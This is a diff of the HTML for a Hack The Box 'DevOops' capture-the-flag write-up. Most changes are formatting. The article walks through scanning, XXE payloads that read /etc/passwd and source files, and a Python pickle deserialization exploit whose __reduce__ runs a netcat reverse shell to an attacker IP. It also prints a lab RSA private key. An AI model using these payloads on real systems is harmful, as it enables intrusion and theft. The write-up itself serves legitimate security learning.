@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.56.3" />
+    <meta name="generator" content="Hugo 0.64.1" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hack The Box Write-up - DevOops | text/plain</title>
@@ -38,8 +38,7 @@ but I ignore this way in for this write-up.
 " />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://dominicbreuker.com/post/htb_devoops/" />
-
-<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322" />
+<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 <meta property="article:published_time" content="2018-10-13T00:00:00+02:00" />
 <meta property="article:modified_time" content="2018-10-13T00:00:00+02:00" />
 
@@ -247,16 +246,14 @@ private key, which can be used to SSH in with root. There is an unintended
 shortcut since the SSH key of the unpriviledged user is accessible via XXE,
 but I ignore this way in for this write-up.
 ">
-
-
 <meta itemprop="datePublished" content="2018-10-13T00:00:00&#43;02:00" />
 <meta itemprop="dateModified" content="2018-10-13T00:00:00&#43;02:00" />
 <meta itemprop="wordCount" content="1441">
+<meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 
 
 
 <meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up," />
-
     <script async src="/js/baffle.js"></script>
     <header>
       <h1 class="baffle" itemprop="headline">Hack The Box Write-up - DevOops</h1>
@@ -291,17 +288,12 @@ but I ignore this way in for this write-up.
   <details>
     <summary>Table of Contents</summary>
     <nav id="TableOfContents">
-<ul>
-<li><a href="#enumeration">Enumeration</a>
-<ul>
-<li><a href="#port-scan">Port scan</a></li>
-<li><a href="#inspecting-gunicorn">Inspecting gunicorn</a></li>
-<li><a href="#reading-files-with-xxe">Reading files with XXE</a></li>
-<li><a href="#rce-with-pickle">RCE with pickle</a></li>
-</ul></li>
-<li><a href="#on-the-system">On the system</a></li>
-<li><a href="#references">References</a></li>
-</ul>
+  <ul>
+    <li><a href="#port-scan">Port scan</a></li>
+    <li><a href="#inspecting-gunicorn">Inspecting gunicorn</a></li>
+    <li><a href="#reading-files-with-xxe">Reading files with XXE</a></li>
+    <li><a href="#rce-with-pickle">RCE with pickle</a></li>
+  </ul>
 </nav>
   </details>
   <script>
@@ -321,22 +313,16 @@ but I ignore this way in for this write-up.
 
 
     <div itemprop="articleBody">
-      
-
-<h1 id="enumeration">Enumeration</h1>
-
+      <h1 id="enumeration">Enumeration</h1>
 <h2 id="port-scan">Port scan</h2>
-
 <p>Start with a fast standard port scan and you find only two open ports:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ masscan -e tun0 -p <span style="color: #ae81ff">1</span>-65535 --rate <span style="color: #ae81ff">2000</span> <span style="color: #ae81ff">10</span>.10.10.91
+<pre><code class="language-console" data-lang="console"> $ masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.91
 ...
 Discovered open port 22/tcp on 10.10.10.91
 Discovered open port 5000/tcp on 10.10.10.91
-</code></pre></div>
-
-<p>A targeted <code>nmap</code> scan confirms SSH on port 22 and identifies port 5000 as a
+</code></pre><p>A targeted <code>nmap</code> scan confirms SSH on port 22 and identifies port 5000 as a
 Python web server, running <a href="https://gunicorn.org/">gunicorn</a>:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ nmap -sV -sC -p <span style="color: #ae81ff">22</span>,5000 <span style="color: #ae81ff">10</span>.10.10.91
+<pre><code class="language-console" data-lang="console"> $ nmap -sV -sC -p 22,5000 10.10.10.91
 ...
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol
@@ -347,70 +333,56 @@ PORT     STATE SERVICE VERSION
 |_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
 5000/tcp open  http    Gunicorn 19.7.1
 |_http-server-header: gunicorn/19.7.1
-|_http-title: Site doesn&#39;,t have a title (text/html; charset=utf-8).
+|_http-title: Site doesn',t have a title (text/html; charset=utf-8).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ...
-</code></pre></div>
-
-<h2 id="inspecting-gunicorn">Inspecting gunicorn</h2>
-
+</code></pre><h2 id="inspecting-gunicorn">Inspecting gunicorn</h2>
 <p>First, start <code>wfuzz</code> to have it running in the background.
 It will find all the necessary endpoints quickly:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ wfuzz --hc<span style="color: #f92672">=</span><span style="color: #ae81ff">404</span> -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.91:5000/FUZZ
+<pre><code class="language-console" data-lang="console"> $ wfuzz --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.91:5000/FUZZ
 ...
 000126:  C=200   1815 L    15336 W        546263 Ch       &quot;feed&quot;
 000366:  C=200      0 L       39 W          347 Ch        &quot;upload&quot;
 019602:  C=405      4 L       23 W          178 Ch        &quot;newpost&quot;
-</code></pre></div>
-
-<p>Visiting the main home page at &ldquo;<a href="http://10.10.10.91:5000&quot;">http://10.10.10.91:5000&quot;</a> returns a simple
+</code></pre><p>Visiting the main home page at &ldquo;http://10.10.10.91:5000&rdquo; returns a simple
 page, indicating the homepage is under development (see HTML below).
 There are no links to the endpoints we discover via fuzzing. Nevertheless, note
 that the page suggests the source code should be in a file called &ldquo;feed.py&rdquo;.
 This will come in handy later:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-html" data-lang="html"><span></span><span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">html</span><span style="color: #f8f8f2">&gt;</span>
-  <span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">body</span><span style="color: #f8f8f2">&gt;</span>
-    Under construction!<span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">br</span><span style="color: #f8f8f2">&gt;</span>
-    <span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">p</span><span style="color: #f8f8f2">&gt;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+  &lt;<span style="color:#f92672">body</span>&gt;
+    Under construction!&lt;<span style="color:#f92672">br</span>&gt;
+    &lt;<span style="color:#f92672">p</span>&gt;
       This is feed.py, which will become the MVP for Blogfeeder application.
-    <span style="color: #f8f8f2">&lt;/</span><span style="color: #f92672">p</span><span style="color: #f8f8f2">&gt;</span>
-    <span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">p</span><span style="color: #f8f8f2">&gt;</span>
+    &lt;/<span style="color:#f92672">p</span>&gt;
+    &lt;<span style="color:#f92672">p</span>&gt;
       TODO: replace this with the proper feed from the dev.solita.fi backend.
-    <span style="color: #f8f8f2">&lt;/</span><span style="color: #f92672">p</span><span style="color: #f8f8f2">&gt;</span>
-    <span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">p</span><span style="color: #f8f8f2">&gt;</span>
-      <span style="color: #f8f8f2">&lt;</span><span style="color: #f92672">img</span> <span style="color: #a6e22e">src</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;/feed&quot;</span> <span style="color: #a6e22e">align</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;center&quot;</span> <span style="color: #a6e22e">width</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;60%&quot;</span> <span style="color: #a6e22e">height</span><span style="color: #f92672">=</span><span style="color: #e6db74">&quot;60%&quot;</span><span style="color: #f8f8f2">&gt;</span>
-    <span style="color: #f8f8f2">&lt;/</span><span style="color: #f92672">p</span><span style="color: #f8f8f2">&gt;</span>
-  <span style="color: #f8f8f2">&lt;/</span><span style="color: #f92672">body</span><span style="color: #f8f8f2">&gt;</span>
-<span style="color: #f8f8f2">&lt;/</span><span style="color: #f92672">html</span><span style="color: #f8f8f2">&gt;</span>
-</code></pre></div>
-
-<p>At &ldquo;<a href="http://10.10.10.91:5000/upload&quot;">http://10.10.10.91:5000/upload&quot;</a> is a file upload, which wants you to
+    &lt;/<span style="color:#f92672">p</span>&gt;
+    &lt;<span style="color:#f92672">p</span>&gt;
+      &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/feed&#34;</span> <span style="color:#a6e22e">align</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;center&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;60%&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;60%&#34;</span>&gt;
+    &lt;/<span style="color:#f92672">p</span>&gt;
+  &lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>At &ldquo;http://10.10.10.91:5000/upload&rdquo; is a file upload, which wants you to
 upload XML files with the fields &ldquo;Author&rdquo;, &ldquo;Subject&rdquo; and &ldquo;Content&rdquo;. We can test
 the endpoint by crafting a sample XML file:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-xml" data-lang="xml"><span></span><span style="color: #75715e">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
-<span style="color: #f92672">&lt;body&gt;</span>
-  <span style="color: #f92672">&lt;Author&gt;</span>auth<span style="color: #f92672">&lt;/Author&gt;</span>
-  <span style="color: #f92672">&lt;Subject&gt;</span>subj<span style="color: #f92672">&lt;/Subject&gt;</span>
-  <span style="color: #f92672">&lt;Content&gt;</span>cont<span style="color: #f92672">&lt;/Content&gt;</span>
-<span style="color: #f92672">&lt;/body&gt;</span>
-</code></pre></div>
-
-<p>On upload the page returns a confirmation that it successfully processed
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#f92672">&lt;body</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#f92672">&lt;Author</span><span style="color:#f92672">&gt;</span>auth<span style="color:#f92672">&lt;/Author&gt;</span>
+  <span style="color:#f92672">&lt;Subject</span><span style="color:#f92672">&gt;</span>subj<span style="color:#f92672">&lt;/Subject&gt;</span>
+  <span style="color:#f92672">&lt;Content</span><span style="color:#f92672">&gt;</span>cont<span style="color:#f92672">&lt;/Content&gt;</span>
+<span style="color:#f92672">&lt;/body&gt;</span>
+</code></pre></div><p>On upload the page returns a confirmation that it successfully processed
 the file:</p>
-
 <pre><code> PROCESSED BLOGPOST: 
 Author: auth
 Subject: subj
 Content: cont
 URL for later reference: /uploads/file.xml
 File path: /home/roosa/deploy/src
-</code></pre>
-
-<p>It also returns the path &ldquo;/home/roosa/deploy/src&rdquo;, which sounds a lot like the
+</code></pre><p>It also returns the path &ldquo;/home/roosa/deploy/src&rdquo;, which sounds a lot like the
 deployed source code should live here.</p>
-
 <h2 id="reading-files-with-xxe">Reading files with XXE</h2>
-
 <p>It is interesting that the upload confirmation contains the content of the
 uploaded XML. If we could inject XML entities, it would be possible to read
 local files from the system, such as
@@ -419,33 +391,27 @@ use an XML parser vulnerable to it if you do not read the
 <a href="https://docs.python.org/2/library/xml.html">docs</a> carefully. For example, just
 writing <code>import xml.sax</code> and using it&rsquo;s <code>make_parser</code> method is enough to build
 a parser which is vulnerable by default.</p>
-
 <p>A simple test is the XML payload below. It injects then contents &ldquo;cont&rdquo; as an
 XML entity named &ldquo;example&rdquo; into the document. If entity injection works, the
 output should not change:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-xml" data-lang="xml"><span></span><span style="color: #75715e">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
-<span style="color: #75715e">&lt;!DOCTYPE replace [&lt;!ENTITY example &quot;cont&quot;&gt;</span> ]&gt;
-<span style="color: #f92672">&lt;body&gt;</span>
-  <span style="color: #f92672">&lt;Author&gt;</span>auth<span style="color: #f92672">&lt;/Author&gt;</span>
-  <span style="color: #f92672">&lt;Subject&gt;</span>subj<span style="color: #f92672">&lt;/Subject&gt;</span>
-  <span style="color: #f92672">&lt;Content&gt;</span><span style="color: #f8f8f2">&amp;example;</span><span style="color: #f92672">&lt;/Content&gt;</span>
-<span style="color: #f92672">&lt;/body&gt;</span>
-</code></pre></div>
-
-<p>Indeed, the endpoint shows the exact same confirmation message as before.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY example &#34;cont&#34;&gt;</span> ]&gt;
+<span style="color:#f92672">&lt;body</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#f92672">&lt;Author</span><span style="color:#f92672">&gt;</span>auth<span style="color:#f92672">&lt;/Author&gt;</span>
+  <span style="color:#f92672">&lt;Subject</span><span style="color:#f92672">&gt;</span>subj<span style="color:#f92672">&lt;/Subject&gt;</span>
+  <span style="color:#f92672">&lt;Content</span><span style="color:#f92672">&gt;</span>&amp;example;<span style="color:#f92672">&lt;/Content&gt;</span>
+<span style="color:#f92672">&lt;/body&gt;</span>
+</code></pre></div><p>Indeed, the endpoint shows the exact same confirmation message as before.
 Reading files now works like so:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-xml" data-lang="xml"><span></span><span style="color: #75715e">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
-<span style="color: #75715e">&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM &quot;file:///etc/passwd&quot;&gt;</span> ]&gt;
-<span style="color: #f92672">&lt;body&gt;</span>
-  <span style="color: #f92672">&lt;Author&gt;</span>auth<span style="color: #f92672">&lt;/Author&gt;</span>
-  <span style="color: #f92672">&lt;Subject&gt;</span>subj<span style="color: #f92672">&lt;/Subject&gt;</span>
-  <span style="color: #f92672">&lt;Content&gt;</span><span style="color: #f8f8f2">&amp;example;</span><span style="color: #f92672">&lt;/Content&gt;</span>
-<span style="color: #f92672">&lt;/body&gt;</span>
-</code></pre></div>
-
-<p>This payload produces the following confirmation method, truncated for
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
+<span style="color:#f92672">&lt;body</span><span style="color:#f92672">&gt;</span>
+  <span style="color:#f92672">&lt;Author</span><span style="color:#f92672">&gt;</span>auth<span style="color:#f92672">&lt;/Author&gt;</span>
+  <span style="color:#f92672">&lt;Subject</span><span style="color:#f92672">&gt;</span>subj<span style="color:#f92672">&lt;/Subject&gt;</span>
+  <span style="color:#f92672">&lt;Content</span><span style="color:#f92672">&gt;</span>&amp;example;<span style="color:#f92672">&lt;/Content&gt;</span>
+<span style="color:#f92672">&lt;/body&gt;</span>
+</code></pre></div><p>This payload produces the following confirmation method, truncated for
 readability:</p>
-
 <pre><code> PROCESSED BLOGPOST: 
 Author: auth
 Subject: subj
@@ -455,107 +421,89 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 git:x:1001:1001:git,,,:/home/git:/bin/bash
 roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
 ...
-</code></pre>
-
-<p>Remember that the source code should live in a file called &ldquo;feed.py&rdquo;, and in a
+</code></pre><p>Remember that the source code should live in a file called &ldquo;feed.py&rdquo;, and in a
 directory called &ldquo;/home/roosa/deploy/src&rdquo;? We can use this knowledge to read it
 with XXE. Request &ldquo;/home/roosa/deploy/src/feed.py&rdquo; and you get the source.</p>
-
 <p>It discloses two things of relevance. One is that there was a deubgconsole for
 development, but it seems to be disabled. Keep it in mind and ignore all other
 hints for the debug console you may find on the box. The other is how the
-endpoint &ldquo;<a href="http://10.10.10.91/newpost&quot;">http://10.10.10.91/newpost&quot;</a> works:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-python" data-lang="python"><span></span><span style="color: #f92672">...</span>
-<span style="color: #a6e22e">@app.route</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;/newpost&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">methods</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">[</span><span style="color: #e6db74">&quot;POST&quot;</span><span style="color: #f8f8f2">])</span>
-<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">newpost</span><span style="color: #f8f8f2">():</span>
-  <span style="color: #75715e"># TODO: proper save to database, this is for testing purposes right now</span>
-  <span style="color: #f8f8f2">picklestr</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">base64</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">urlsafe_b64decode(request</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">data)</span>
-<span style="color: #75715e">#  return picklestr</span>
-  <span style="color: #f8f8f2">postObj</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">pickle</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">loads(picklestr)</span>
-  <span style="color: #66d9ef">return</span> <span style="color: #e6db74">&quot;POST RECEIVED: &quot;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">postObj[</span><span style="color: #e6db74">&#39;Subject&#39;</span><span style="color: #f8f8f2">]</span>
+endpoint &ldquo;http://10.10.10.91/newpost&rdquo; works:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/newpost</span><span style="color:#e6db74">&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">POST</span><span style="color:#e6db74">&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">newpost</span>():
+  <span style="color:#75715e"># TODO: proper save to database, this is for testing purposes right now</span>
+  picklestr <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64decode(request<span style="color:#f92672">.</span>data)
+<span style="color:#75715e">#  return picklestr</span>
+  postObj <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>loads(picklestr)
+  <span style="color:#66d9ef">return</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">POST RECEIVED: </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> postObj[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Subject</span><span style="color:#e6db74">&#39;</span>]
 
 
-<span style="color: #75715e">## TODO: VERY important! DISABLED THIS IN PRODUCTION</span>
-<span style="color: #75715e">#app = DebuggedApplication(app, evalex=True, console_path=&#39;/debugconsole&#39;)</span>
-<span style="color: #75715e"># TODO: Replace run-gunicorn.sh with real Linux service script</span>
-<span style="color: #75715e"># app = DebuggedApplication(app, evalex=True, console_path=&#39;/debugconsole&#39;)</span>
+<span style="color:#75715e">## TODO: VERY important! DISABLED THIS IN PRODUCTION</span>
+<span style="color:#75715e">#app = DebuggedApplication(app, evalex=True, console_path=&#39;/debugconsole&#39;)</span>
+<span style="color:#75715e"># TODO: Replace run-gunicorn.sh with real Linux service script</span>
+<span style="color:#75715e"># app = DebuggedApplication(app, evalex=True, console_path=&#39;/debugconsole&#39;)</span>
 
-<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">__name__</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&quot;__main__&quot;</span><span style="color: #f8f8f2">:</span>
-  <span style="color: #f8f8f2">app</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">run(host</span><span style="color: #f92672">=</span><span style="color: #e6db74">&#39;0.0.0,0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">Debug</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">True)</span>
-</code></pre></div>
-
-<h2 id="rce-with-pickle">RCE with pickle</h2>
-
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">__main__</span><span style="color:#e6db74">&#34;</span>:
+  app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0.0.0,0</span><span style="color:#e6db74">&#39;</span>, Debug<span style="color:#f92672">=</span>True)
+</code></pre></div><h2 id="rce-with-pickle">RCE with pickle</h2>
 <p>The snipped above shows how the request data is fed into
 <a href="https://docs.python.org/2/library/pickle.html">pickle</a>, a Python module for
 serialization of Python objects. It can be very useful but is not meant to be
 used on untrusted input, as the big red box in the Python docs indicates.</p>
-
 <p>Exploiting pickle to get code execution is <a href="https://lincolnloop.com/blog/playing-pickle-security/">very
 easy</a>. But first, we
 start by getting the basics right and craft a working payload. The code expects
 a base64-encoded pickle string, turns it into an object, apparently expecting a
 Python dictionary. It then reads the &lsquo;Subject&rsquo; item and returns that as text.
 The following code snippet produces a valid payload:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-python" data-lang="python"><span></span><span style="color: #f92672">import</span> <span style="color: #f8f8f2">cPickle</span>
-<span style="color: #f92672">import</span> <span style="color: #f8f8f2">base64</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> cPickle
+<span style="color:#f92672">import</span> base64
 
-<span style="color: #f8f8f2">post</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{</span><span style="color: #e6db74">&#39;Subject&#39;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;mynewpost&quot;</span><span style="color: #f8f8f2">}</span>
+post <span style="color:#f92672">=</span> {<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Subject</span><span style="color:#e6db74">&#39;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">mynewpost</span><span style="color:#e6db74">&#34;</span>}
 
-<span style="color: #f8f8f2">payload</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">cPickle</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">dumps(post)</span>
-<span style="color: #f8f8f2">encoded</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">base64</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">urlsafe_b64encode(payload)</span>
-<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(encoded)</span>
-</code></pre></div>
-
-<p>Submitting it returns the expected response:</p>
-
+payload <span style="color:#f92672">=</span> cPickle<span style="color:#f92672">.</span>dumps(post)
+encoded <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(payload)
+<span style="color:#66d9ef">print</span>(encoded)
+</code></pre></div><p>Submitting it returns the expected response:</p>
 <pre><code> $ curl -X POST -H &quot;Content-Type: text/plain&quot; -d &quot;$(python make_post.py)&quot; http://10.10.10.91:5000/newpost
 POST RECEIVED: mynewpost
-</code></pre>
-
-<p>Time to modify the pickle string such that we get a shell. We use the
+</code></pre><p>Time to modify the pickle string such that we get a shell. We use the
 <a href="https://docs.python.org/2/library/pickle.html#pickling-and-unpickling-extension-types">__reduce__</a>
 method for it, which is a special method allowing custom Python objects to
 declare how they can be reconstructed. Basically, you return a function and
 arguments, and they will be executed when Python tries to deserialize the
 object. You can just make it execute a shell command:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-python" data-lang="python"><span></span><span style="color: #f92672">import</span> <span style="color: #f8f8f2">os</span>
-<span style="color: #f92672">import</span> <span style="color: #f8f8f2">cPickle</span>
-<span style="color: #f92672">import</span> <span style="color: #f8f8f2">base64</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> cPickle
+<span style="color:#f92672">import</span> base64
 
-<span style="color: #f8f8f2">cmd</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.130 9000 &gt;/tmp/x&#39;</span>
+cmd <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.130 9000 &gt;/tmp/x</span><span style="color:#e6db74">&#39;</span>
 
-<span style="color: #66d9ef">class</span> <span style="color: #a6e22e">MyClass</span><span style="color: #f8f8f2">(object):</span>
-    <span style="color: #66d9ef">def</span> <span style="color: #a6e22e">__reduce__</span><span style="color: #f8f8f2">(self):</span>
-        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">(os</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">system,</span> <span style="color: #f8f8f2">(cmd,))</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyClass</span>(object):
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system, (cmd,))
 
-<span style="color: #f8f8f2">payload</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">cPickle</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">dumps(MyClass())</span>
-<span style="color: #f8f8f2">encoded</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">base64</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">urlsafe_b64encode(payload)</span>
-<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(encoded)</span>
-</code></pre></div>
-
-<p>Submit it like the payload before, and don&rsquo;t forget to listen on 9000. The
+payload <span style="color:#f92672">=</span> cPickle<span style="color:#f92672">.</span>dumps(MyClass())
+encoded <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(payload)
+<span style="color:#66d9ef">print</span>(encoded)
+</code></pre></div><p>Submit it like the payload before, and don&rsquo;t forget to listen on 9000. The
 upload will hang and you get a shell:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ nc -lnvp <span style="color: #ae81ff">9000</span>
+<pre><code class="language-console" data-lang="console"> $ nc -lnvp 9000
 listening on [any] 9000 ...
 connect to [10.10.15.130] from (UNKNOWN) [10.10.10.91] 52904
-/bin/sh: 0: can&#39;t access tty; job control turned off
+/bin/sh: 0: can't access tty; job control turned off
 $ id
 uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
-</code></pre></div>
-
-<h1 id="on-the-system">On the system</h1>
-
+</code></pre><h1 id="on-the-system">On the system</h1>
 <p>We have a shell with the user &ldquo;roosa&rdquo;, which seems to be in group &ldquo;sudo&rdquo;.
 Thus, one thing to try is to upgrade the shell to a fully interactive TTY as
 described
 <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method3upgradingfromnetcatwithmagic">here</a>.
 Then try <code>sudo -l</code> to see what you can do. For me though, this command just hang
 longer than I was willing to wait.</p>
-
 <p>Anyways, just looking around in the home directory of &ldquo;roosa&rdquo; reveals an
 interesting folder with source code and, most interestingly, an RSA key:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>roosa@gitter:~/work/blogfeed$ cat resources/integration/authcredentials.key
+<pre><code class="language-console" data-lang="console">roosa@gitter:~/work/blogfeed$ cat resources/integration/authcredentials.key
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
 ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
@@ -563,10 +511,8 @@ ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
 T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
 bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
 -----END RSA PRIVATE KEY-----
-</code></pre></div>
-
-<p>Looking further, we see it is a git repository:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>roosa@gitter:~/work/blogfeed$ ll
+</code></pre><p>Looking further, we see it is a git repository:</p>
+<pre><code class="language-console" data-lang="console">roosa@gitter:~/work/blogfeed$ ll
 total 28
 drwxrwx--- 5 roosa roosa 4096 Mar 21  2018 ./
 drwxrwxr-x 3 roosa roosa 4096 Mar 21  2018 ../
